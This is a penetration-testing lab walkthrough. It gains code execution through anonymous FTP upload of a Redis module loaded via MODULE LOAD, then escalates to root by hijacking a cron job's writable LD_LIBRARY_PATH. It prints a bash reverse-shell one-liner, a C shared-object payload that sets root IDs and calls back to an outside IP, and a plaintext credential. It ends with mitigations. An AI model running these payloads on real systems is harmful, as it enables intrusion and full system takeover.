## Introduction

In this walkthrough, I gained **remote code execution** by chaining together a misconfigured **Redis instance** and an **anonymous FTP service**. The Redis server had the `MODULE LOAD` capability enabled, allowing dynamic loading of modules from local paths. I leveraged the FTP service to **upload a malicious Redis module**, which I then loaded via the Redis command to gain initial execution.

For privilege escalation, I discovered a **cron job running as root** that used a writable directory in its **`LD_LIBRARY_PATH`**. I placed a **malicious shared object** in that directory to hijack the cron environment and successfully escalated privileges to **root**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 21

- Version - 3.0.2

```bash
searchsploit vsftpd 3.0.2
```

**No result.**

- Anonymous login is successful
    
    ```bash
    ftp $IP
    ```
    
    ![image.png](image%203.png)
    
    `pub` directory is empty but we **have write access there.**
    

### Port 22

- Version - OpenSSH 7.4 (protocol 2.0)

We usually skip SSH.

### Port 6379 (Redis)

- Version Redis key-value store 5.0.9

For redis I usually use:
[Redis Pentesting](https://exploit-notes.hdks.org/exploit/database/redis-pentesting/)

[Redis-Pentesting-Best-Practices](https://secybr.com/posts/redis-pentesting-best-practices/)

I didn’t find any keys:

![image.png](image%204.png)

- **Redis-rce 4.x-5.x**
    
    There is one public exploits for Redis versions 4.x and 5.x
    
    [Redis 4.x/5.x RCE](https://github.com/Ridter/redis-rce?tab=readme-ov-file)
    
    I tied running the exploit but it kept returning error
    
    ![image.png](image%205.png)
    
- [**Load Module**](https://secybr.com/posts/redis-pentesting-best-practices/#load-redis-module)
    
    To make a module we are gonna use this repe:
    
    [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
    
    
    >But remember to add  `string.h` and `arpa/inet.h` to `module.c` 
    {: .prompt-warning }
    
    I noticed that it says we need some way to upload module to the target and we have write access to ftp share.
    
    ![image.png](image%206.png)

    `Respective root directories of ftp and smb`
    ```bash
    ftp 
    - /srv/ftp
    - /var/ftp
    
    smb
    - /srv/samba
    - /etc/samba/smb.conf
    ```
    

## Web

### Port 80

- Version - Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)

Gobuster scan

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 42
```

![image.png](image%207.png)

Nothing in `sitemap.xml`, we are forbidden to access any other directory that `login`, I tried `admin:admin`, `admin:password`, `sybaris:sybaris` but didn’t work. That means we should check full port scan.

I searched for public exploits of `HTMLy v2.7.5` but didn’t find anything.

## Exploitation

After loading module let’s try to execute commands:

![image.png](image%208.png)

Now let’s get a reverse shell:

```bash
bash -i >& /dev/tcp/192.168.45.154/6379 0>&1
```

![image.png](image%209.png)

Now we have a shell.

Enumerating web directories I found password for pablo:

Now we can ssh into the box.

There is a cron job owned by root but we don’t have write access to it:

![image.png](image%2012.png)

Let’s run `linpeas.sh` 

![image.png](image%2013.png)

`LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils`

`/usr/bin/log-sweeper`

Let’s see which shared libraries the binary is using with `ldd` command:

```bash
ldd /usr/bin/log-sweeper
```

![image.png](image%2014.png)

We can inject to anyone, even though it is not mandatory each shared library will work for PrivEsc. Among them the easiest one is `utils.so` which is not found. We are gonna create the library put it inside `/usr/local/lib/dev` , because this path is among directories that `LD_LIBRARY_PATH` contain which means when binary is run that path will be checked for `utils.so`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH"); // Remove the environment variable
    setresuid(0, 0, 0);          // Set user ID to root
    system("bash -i >& /dev/tcp/192.168.45.154/80 0>&1");      // Spawn a privileged shell
}

```

Then compile `.c` file on the target itself:

```c
gcc -fPIC -shared -o utils.so utils.c
```

and put it inside `/usr/local/lib/dev` directory and wait for reverse shell.

After that we got a reverse shell as root user.

## Credentials

```bash
pablo : PostureAlienateArson345
```

## Mitigation

- **Disable `MODULE LOAD` in Redis** if not explicitly required and restrict access to Redis from untrusted networks.
- **Restrict or disable anonymous FTP access**, especially write permissions, and monitor file uploads.
- Ensure **cron jobs running as root** do not rely on untrusted or writable directories in their environment paths (like `LD_LIBRARY_PATH`).
- Use **AppArmor** or **SELinux** to restrict dynamic library loading and execution of untrusted code.
- Monitor for unusual Redis module loads and cron behavior using **log analysis and file integrity monitoring tools**.
